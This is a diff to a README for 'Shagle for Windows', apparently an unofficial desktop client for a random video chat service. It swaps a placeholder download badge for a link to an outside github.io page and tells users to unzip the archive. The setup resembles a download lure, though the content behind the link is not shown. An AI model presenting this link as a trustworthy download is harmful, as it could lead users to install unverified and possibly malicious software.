@@ -6,7 +6,7 @@ Shagle for Windows provides instant access to random video chat with strangers w
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://shagle-desktop-windows-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
